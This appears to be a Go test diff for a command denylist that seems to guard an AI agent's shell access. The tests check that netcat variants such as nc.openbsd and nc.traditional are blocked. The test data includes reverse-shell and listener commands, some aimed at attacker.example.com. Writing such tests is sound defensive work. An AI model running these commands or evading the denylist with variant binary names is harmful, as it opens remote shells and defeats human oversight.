@@ -2325,3 +2325,72 @@ func TestDenyReason_MkfsTypeVariants(t *testing.T) {
 		}
 	}
 }
+
+// TestIsDenied_BlocksNcTypeVariants verifies that nc.TYPE netcat variants
+// (e.g. nc.openbsd, nc.traditional) are denied when "nc" is in the denylist.
+// On Debian/Ubuntu the netcat-openbsd package installs its binary as
+// /bin/nc.openbsd (with /bin/nc as a symlink), and netcat-traditional installs
+// /bin/nc.traditional. These names contain letters after the dot, so the
+// versioned-variant TrimRight heuristic (which strips only digits/dots) never
+// reduces them to "nc" — the explicit nc.TYPE prefix check closes the gap.
+func TestIsDenied_BlocksNcTypeVariants(t *testing.T) {
+	denied := [][]string{
+		{"nc.openbsd", "-e", "/bin/bash", "10.0.0.1", "4444"},
+		{"nc.traditional", "-l", "-p", "4444"},
+		{"/bin/nc.openbsd", "attacker.example.com", "1234"},
+		{"/bin/nc.traditional", "-e", "/bin/sh", "10.0.0.1", "4444"},
+	}
+	for _, argv := range denied {
+		if !isDenied(DefaultDeniedCommands, argv) {
+			t.Errorf("expected nc.TYPE variant denied: %v", argv)
+		}
+	}
+}
+
+// TestIsDenied_NcTypeRespectsDenylist verifies that the nc.TYPE check honours
+// the custom denylist: if "nc" is not in the denylist, nc.TYPE variants must
+// not be blocked by this rule.
+func TestIsDenied_NcTypeRespectsDenylist(t *testing.T) {
+	// Custom denylist without nc — nc.TYPE variants must pass.
+	custom := map[string]bool{"rm": true, "dd": true}
+	allowed := [][]string{
+		{"nc.openbsd", "host", "80"},
+		{"nc.traditional", "-l", "8080"},
+	}
+	for _, argv := range allowed {
+		if isDenied(custom, argv) {
+			t.Errorf("expected %v to be allowed when \"nc\" is not in denylist", argv)
+		}
+	}
+
+	// With nc in the denylist the same commands must be denied.
+	withNc := map[string]bool{"rm": true, "nc": true}
+	for _, argv := range allowed {
+		if !isDenied(withNc, argv) {
+			t.Errorf("expected %v to be denied when \"nc\" is in denylist", argv)
+		}
+	}
+}
+
+// TestDenyReason_NcTypeVariants verifies that denyReason returns a targeted
+// message for nc.TYPE commands (not the generic "not allowed" fallback) so
+// that Claude understands why the command was blocked and does not retry with
+// another netcat variant.
+func TestDenyReason_NcTypeVariants(t *testing.T) {
+	cases := [][]string{
+		{"nc.openbsd", "attacker.example.com", "4444"},
+		{"nc.traditional", "-e", "/bin/sh", "host", "9999"},
+		{"/bin/nc.openbsd", "-l", "-p", "4444"},
+	}
+	for _, argv := range cases {
+		msg := denyReason(DefaultDeniedCommands, argv)
+		// Message must mention "nc" so Claude knows what the base command is.
+		if !strings.Contains(msg, "nc") {
+			t.Errorf("denyReason(%v) = %q; expected \"nc\" in message", argv, msg)
+		}
+		// Must NOT fall through to the generic "not allowed" message.
+		if strings.Contains(msg, "not allowed (destructive or privileged command)") {
+			t.Errorf("denyReason(%v) returned generic message instead of targeted guidance: %q", argv, msg)
+		}
+	}
+}
